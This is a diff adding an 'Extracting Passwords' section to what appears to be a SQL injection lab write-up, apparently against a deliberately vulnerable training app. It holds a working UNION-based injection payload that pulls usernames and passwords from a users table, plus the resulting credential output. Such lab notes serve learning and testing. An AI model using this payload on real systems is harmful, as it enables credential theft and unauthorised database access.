@@ -126,6 +126,28 @@ First name:
 Surname: users
 failed_login
 ```
+---
+
+## Extracting Passwords
+
+To extract user data including passwords, ran:
+
+```sql
+' OR 1=1 UNION SELECT NULL, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) FROM users #
+```
+
+- Output revealed user credentials:
+
+  ```
+  First name:
+  Surname: admin
+  admin
+  password
+  ```
+
+Successfully accessed usernames and passwords in plain text.
+
+---
 
 Confirmed that `password` and other useful fields exist in the `users` table.
 
